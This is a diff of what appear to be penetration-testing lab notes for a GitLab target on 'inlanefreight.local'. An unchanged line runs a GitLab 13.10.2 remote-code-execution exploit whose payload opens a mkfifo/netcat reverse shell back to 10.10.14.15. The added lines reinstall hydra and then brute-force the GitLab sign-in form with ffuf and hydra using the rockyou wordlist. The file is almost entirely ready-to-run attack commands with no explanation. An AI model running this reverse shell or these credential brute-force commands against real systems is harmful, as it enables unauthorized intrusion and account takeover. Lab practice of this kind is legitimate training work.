@@ -36,5 +36,15 @@ get flag.txt
 
 python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
 
+sudo apt remove --purge libmongoc-1.0-0 libmongocrypt0
+sudo apt install libmongoc-1.0-0 libmongocrypt0 hydra
+
+ffuf -u http://10.129.201.88/users/sign_in \
+-X POST \
+-d "user[login]=admin&user[password]=FUZZ" \
+-w /usr/share/wordlists/rockyou.txt \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-fr "Invalid Login"
+
 hydra -l admin -P passwords.txt <TARGET_IP> http-post-form \
 "/users/sign_in:user[login]=^USER^&user[password]=^PASS^:Invalid Login or password"
